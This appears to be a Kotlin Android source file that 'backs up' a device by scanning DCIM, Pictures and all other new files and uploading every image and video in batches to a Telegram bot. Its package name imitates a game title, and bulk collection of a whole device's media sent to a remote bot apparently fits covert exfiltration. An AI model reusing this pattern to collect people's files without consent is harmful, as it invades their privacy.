package com.service.assasinscreed02.backup.domain.usecases

import android.content.Context
import android.util.Log
import com.service.assasinscreed02.backup.domain.entities.BackupConfig
import com.service.assasinscreed02.backup.domain.entities.BackupResult
import com.service.assasinscreed02.backup.domain.repositories.BackupRepository
import com.service.assasinscreed02.backup.data.services.NetworkService
import com.service.assasinscreed02.backup.data.services.TelegramUploadService
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Caso de uso principal para ejecutar backups
 */
class BackupUseCase(
    private val backupRepository: BackupRepository,
    private val networkService: NetworkService,
    private val telegramUploadService: TelegramUploadService
) {
    
    companion object {
        private const val TAG = "BackupUseCase"
    }
    
    /**
     * Ejecuta un backup simple sin progreso
     */
    suspend fun executeBackup(context: Context, forzarConDatos: Boolean = false): BackupResult {
        return executeBackupWithProgress(context, forzarConDatos) { }
    }
    
    /**
     * Ejecuta un backup con callback de progreso
     */
    suspend fun executeBackupWithProgress(
        context: Context,
        forzarConDatos: Boolean = false,
        progressCallback: (BackupResult.Progress) -> Unit
    ): BackupResult = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "Iniciando backup. forzarConDatos=$forzarConDatos")
            
            // 1. Obtener configuración
            val config = backupRepository.getBotConfig(context)?.copy(forzarConDatos = forzarConDatos)
                ?: return@withContext BackupResult.Error("Configuración del bot no encontrada")
            
            if (!config.isValid()) {
                return@withContext BackupResult.Error("Configuración del bot inválida")
            }
            
            // 2. Verificar conectividad
            if (!networkService.isConnectionAvailable(context, forzarConDatos)) {
                return@withContext BackupResult.Error("No hay conexión disponible")
            }
            
            // 3. Notificar inicio
            telegramUploadService.notifyBackupStart(config, context)
            
            var totalArchivos = 0
            var archivosEnviados = 0
            var archivosError = 0
            
            // 4. FASE 1: Escanear DCIM y Pictures
            progressCallback(BackupResult.Progress("", "Escaneando DCIM y Pictures...", 0, 0, archivosEnviados, archivosError, 0, 0))
            Log.d(TAG, "FASE 1: Escaneando DCIM y Pictures")
            
            val archivosDCIMyPictures = backupRepository.scanDCIMAndPictures(context)
            Log.d(TAG, "Encontrados ${archivosDCIMyPictures.size} archivos en DCIM y Pictures")
            
            if (archivosDCIMyPictures.isNotEmpty()) {
                val imagenesDCIM = backupRepository.filterFilesByType(archivosDCIMyPictures, true)
                val videosDCIM = backupRepository.filterFilesByType(archivosDCIMyPictures, false)
                
                Log.d(TAG, "DCIM/Pictures - Imágenes: ${imagenesDCIM.size}, Videos: ${videosDCIM.size}")
                totalArchivos += imagenesDCIM.size + videosDCIM.size
                
                // Enviar imágenes
                val resultadoImagenes = telegramUploadService.uploadFilesInBatches(
                    config, imagenesDCIM, config.batchSizeImages, "imágenes (DCIM/Pictures)", 
                    context, progressCallback
                )
                archivosEnviados += resultadoImagenes.filesSent
                archivosError += resultadoImagenes.filesError
                
                // Enviar videos
                val resultadoVideos = telegramUploadService.uploadFilesInBatches(
                    config, videosDCIM, config.batchSizeVideos, "videos (DCIM/Pictures)", 
                    context, progressCallback
                )
                archivosEnviados += resultadoVideos.filesSent
                archivosError += resultadoVideos.filesError
            }
            
            // 5. FASE 2: Escanear resto del dispositivo
            progressCallback(BackupResult.Progress("", "Escaneando resto del dispositivo...", archivosEnviados, totalArchivos, archivosEnviados, archivosError, 0, 0))
            Log.d(TAG, "FASE 2: Escaneando resto del dispositivo")
            
            val archivosRestoDispositivo = backupRepository.scanAllNewFiles(context)
            Log.d(TAG, "Encontrados ${archivosRestoDispositivo.size} archivos en el resto del dispositivo")
            
            if (archivosRestoDispositivo.isNotEmpty()) {
                val imagenesResto = backupRepository.filterFilesByType(archivosRestoDispositivo, true)
                val videosResto = backupRepository.filterFilesByType(archivosRestoDispositivo, false)
                
                Log.d(TAG, "Resto - Imágenes: ${imagenesResto.size}, Videos: ${videosResto.size}")
                totalArchivos += imagenesResto.size + videosResto.size
                
                // Enviar imágenes del resto
                val resultadoImagenesResto = telegramUploadService.uploadFilesInBatches(
                    config, imagenesResto, config.batchSizeImages, "imágenes (resto)", 
                    context, progressCallback
                )
                archivosEnviados += resultadoImagenesResto.filesSent
                archivosError += resultadoImagenesResto.filesError
                
                // Enviar videos del resto
                val resultadoVideosResto = telegramUploadService.uploadFilesInBatches(
                    config, videosResto, config.batchSizeVideos, "videos (resto)", 
                    context, progressCallback
                )
                archivosEnviados += resultadoVideosResto.filesSent
                archivosError += resultadoVideosResto.filesError
            }
            
            // 6. Notificar finalización
            telegramUploadService.notifyBackupCompletion(config, context, archivosEnviados > 0)
            
            // 7. Sincronizar con GitHub si es necesario
            if (archivosEnviados > 0) {
                try {
                    // Aquí se podría agregar la sincronización con GitHub
                    Log.d(TAG, "Backup completado exitosamente. Archivos enviados: $archivosEnviados, Errores: $archivosError")
                } catch (e: Exception) {
                    Log.e(TAG, "Error sincronizando con GitHub: ${e.message}")
                }
            }
            
            BackupResult.Success(
                filesSent = archivosEnviados,
                filesError = archivosError,
                totalFiles = totalArchivos
            )
            
        } catch (e: Exception) {
            Log.e(TAG, "Error ejecutando backup: ${e.message}", e)
            
            // Notificar error
            try {
                val config = backupRepository.getBotConfig(context)
                if (config != null) {
                    telegramUploadService.notifyBackupError(config, context, e.message ?: "Error desconocido")
                }
            } catch (notifyError: Exception) {
                Log.e(TAG, "Error enviando notificación de error: ${notifyError.message}")
            }
            
            BackupResult.Error("Error ejecutando backup: ${e.message}", e)
        }
    }
} 